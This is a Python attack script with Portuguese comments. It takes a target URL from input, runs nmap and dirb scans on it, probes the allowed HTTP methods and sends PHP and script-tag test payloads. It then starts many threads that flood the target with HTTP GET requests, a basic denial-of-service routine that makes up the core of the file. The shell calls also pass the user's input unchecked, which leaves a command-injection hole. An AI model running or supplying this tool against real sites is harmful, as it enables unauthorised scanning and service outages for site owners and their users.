import requests
import threading
import logging
import os
import time

# Solicita ao usuário a URL do alvo a ser testado
url_alvo = input("Digite a URL de destino: ")
# Solicita ao usuário a quantidade de threads que serão utilizadas
num_threads = int(input("Informe o número de threads: "))
# Solicita ao usuário o número máximo de requisições que cada thread deve fazer
max_requisicoes_por_thread = int(input("Máximo de requisições por thread: "))

# Configuração do sistema de registro de eventos (logging)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Função para escanear as portas do servidor usando a ferramenta externa nmap
def scan_ports():
    os.system(f"nmap -Pn {url_alvo}")

# Função para escanear os diretórios do servidor usando a ferramenta externa dirb
def scan_directories():
    os.system(f"dirb {url_alvo}")

# Função para verificar quais métodos HTTP são permitidos no servidor alvo
def verifica_metodos_http():
    # Lista de métodos HTTP a serem testados
    metodos = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD']
    metodos_permitidos = []
    for metodo in metodos:
        try:
            # Testa cada método para ver se é permitido pelo servidor
            resposta = requests.request(metodo, url_alvo, timeout=5)
            if resposta.status_code != 405:
                metodos_permitidos.append(metodo)
        except requests.RequestException as e:
            # Registra um erro se a verificação falhar
            logging.error(f"Erro ao verificar o método {metodo}: {str(e)}")
    return metodos_permitidos

# Função para enviar diferentes tipos de cargas úteis através dos métodos permitidos
def envia_cargas(metodos_permitidos):
    # Dicionário contendo tipos de cargas úteis
    cargas = {
        'php': "<?php echo 'Hello, world!'; ?>",
        'js': "<script>alert('Hello, world!');</script>"
    }
    for metodo in metodos_permitidos:
        for lang, carga in cargas.items():
            try:
                # Envio das cargas úteis usando os métodos permitidos
                if metodo in ['POST', 'PUT']:
                    resposta = requests.request(metodo, url_alvo, data={lang: carga}, timeout=5)
                    if resposta:
                        logging.info(f"Resposta de {metodo}: {resposta.text}")
                    else:
                        logging.info(f"Sem resposta de {metodo}")
            except requests.RequestException as e:
                # Registra um erro se o envio da carga falhar
                logging.error(f"Erro ao enviar carga com {metodo}: {str(e)}")

# Função para realizar um método http ao servidor alvo
def inundacao_http():
    with requests.Session() as sessao:
        for _ in range(max_requisicoes_por_thread):
            try:
                # Envia uma requisição GET para o servidor
                sessao.get(url_alvo, timeout=5)
                logging.info("Requisição enviada com sucesso")
            except requests.RequestException as e:
                # Registra um erro se a requisição falhar
                logging.error(f"Falha ao enviar requisição: {str(e)}")
                # Pausa antes de tentar novamente
                time.sleep(1)

# Função principal que coordena todas as operações
def main():
    scan_ports()
    scan_directories()
    metodos_permitidos = verifica_metodos_http()
    envia_cargas(metodos_permitidos)

    threads = []
    for _ in range(num_threads):
        # Criação de múltiplas threads para realizar a inundação HTTP
        t = threading.Thread(target=inundacao_http)
        threads.append(t)
        t.start()

    for t in threads:
        # Aguarda todas as threads terminarem
        t.join()

if __name__ == "__main__":
    main()
